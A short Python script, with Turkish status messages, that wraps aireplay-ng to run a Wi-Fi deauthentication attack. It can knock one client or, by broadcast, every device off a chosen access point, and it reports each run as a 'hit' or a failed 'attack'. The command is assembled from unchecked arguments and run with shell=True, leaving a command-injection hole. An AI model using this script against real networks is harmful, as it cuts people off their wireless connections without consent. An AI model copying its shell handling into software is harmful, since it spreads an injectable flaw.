import subprocess

def pulse_kick(interface, bssid, client=None, packets=15):
    if client:
        print(f"\n    [*] Hedef cihaz ({client}) ağdan ({bssid}) düşürülüyor...")
        cmd = f"sudo aireplay-ng -0 {packets} -a {bssid} -c {client} {interface}"
    else:
        print(f"\n    [*] Tüm ağ ({bssid}) Broadcast ile hedef alınıyor...")
        cmd = f"sudo aireplay-ng -0 {packets} -a {bssid} {interface}"
    
    try:
        subprocess.run(cmd, shell=True)
        print(f"    [✔] Vuruş başarılı (Gönderilen Paket: {packets}).")
    except Exception as e:
        print(f"    [✘] Saldırı başarısız! Hata: {e}")